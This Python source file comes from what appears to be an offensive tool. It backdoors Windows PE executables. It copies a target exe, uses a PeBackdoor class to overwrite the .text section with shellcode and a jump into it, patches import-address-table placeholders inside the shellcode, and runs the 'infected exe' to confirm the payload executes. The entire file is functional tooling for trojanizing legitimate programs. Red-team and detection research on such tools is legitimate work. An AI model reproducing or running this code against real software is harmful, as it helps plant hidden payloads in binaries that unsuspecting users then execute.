from helper import *
import shutil
import pprint
import logging
import time
import tempfile

from pehelper import *
from model import *
from observer import observer

from derbackdoorer.derbackdoorer import PeBackdoor

logger = logging.getLogger("Injector")


def inject_exe(
    shellcode_in: FilePath,
    exe_in: FilePath,
    exe_out: FilePath,
    inject_mode: int,
):
    logger.info("--[ Injecting: {} into: {} -> {} mode {}".format(
        shellcode_in, exe_in, exe_out, inject_mode
    ))



    # create copy of file exe_in to exe_out
    shutil.copyfile(exe_in, exe_out)
    
    # backdoor
    peinj = PeBackdoor()
    result = peinj.backdoor(
        1, # always overwrite .text section
        inject_mode, 
        shellcode_in, 
        exe_in, 
        exe_out
    )
    if not result:
        logging.error("Error: Redbackdoorer failed")
        raise Exception("Redbackdoorer failed")

    # verify and log
    shellcode = file_readall_binary(shellcode_in)
    shellcode_len = len(shellcode)
    code = extract_code_from_exe(exe_out)
    in_code = code[peinj.shellcodeOffsetRel:peinj.shellcodeOffsetRel+shellcode_len]
    jmp_code = code[peinj.backdoorOffsetRel:peinj.backdoorOffsetRel+12]
    observer.add_code("backdoored_code", in_code)
    observer.add_code("backdoored_jmp", jmp_code)
    if in_code != shellcode:
        raise Exception("Shellcode injection error")


def injected_fix_iat(exe_out: FilePath, exe_info: ExeInfo):
    """replace IAT in shellcode in code and re-implant it"""

    # get code section of exe_out
    code = extract_code_from_exe(exe_out)
    for cap in exe_info.get_all_iat_resolvs().values():
        if not cap.id in code:
            raise Exception("IatResolve ID {} not found, abort".format(cap.id))
        
        off = code.index(cap.id)
        current_address = off + exe_info.image_base + exe_info.code_virtaddr
        destination_address = cap.addr
        logger.info("    Replace at 0x{:x} with call to 0x{:x}".format(
            current_address, destination_address
        ))
        jmp = assemble_and_disassemble_jump(
            current_address, destination_address
        )
        code = code.replace(cap.id, jmp)

    # write back our patched code into the exe
    write_code_section(exe_file=exe_out, new_data=code)


def verify_injected_exe(exefile: FilePath) -> int:
    logger.info("---[ Verify infected exe: {} ".format(exefile))
    # remove indicator file
    pathlib.Path(project.verify_filename).unlink(missing_ok=True)

    run_process_checkret([
        exefile,
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(project.verify_filename):
        logger.info("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(project.verify_filename)
        return 0
    else:
        logger.warning("---> Verify FAIL. Infected exe does not work (no file created)")
        return 1

